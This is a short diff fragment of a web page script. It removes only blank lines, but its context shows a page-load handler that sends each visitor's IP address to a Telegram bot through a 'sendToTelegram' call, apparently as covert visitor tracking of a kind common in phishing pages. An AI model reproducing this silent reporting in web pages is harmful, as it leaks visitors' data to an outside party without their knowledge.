@@ -1024,6 +1024,4 @@ document.addEventListener('DOMContentLoaded', function() {
             await sendToTelegram(`🎌 New Visitor 🎌\n📡 IP: ${ip}\n⚠️ Country detection failed`);
         });
 });
-
 </script>
-
